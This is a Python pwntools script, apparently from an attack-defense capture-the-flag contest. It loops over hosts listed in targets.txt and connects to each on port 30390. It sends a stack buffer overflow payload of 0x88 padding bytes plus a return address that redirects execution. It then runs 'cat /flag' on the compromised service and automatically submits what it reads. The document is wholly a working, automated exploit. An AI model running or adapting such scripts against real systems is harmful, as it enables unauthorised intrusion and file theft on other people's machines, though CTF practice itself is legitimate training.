from pwn import *
from submit_flag import submit_flag


def pwn_flag():
    with open('targets.txt', 'r') as f:
        targets = f.readlines()
        for target in targets:
            target = target.strip()
            context.log_level = 'debug'
            p = remote(target, 30390)
            sh_addr = 0x400596
            exp = b"cat /flag"
            p.sendlineafter("Hello, World", b"a" * 0x88 + p64(sh_addr))
            p.sendline(exp)
            res = p.recvall(timeout=1)
            res = res.decode("utf-8")
            res = res.strip()
            res = "flag{" + res +"}"
            pattern = "flag\{.*\}"
            #pattern = ".*"
            z = re.search(pattern, res)
            flag = z.group()
            submit_flag(flag)


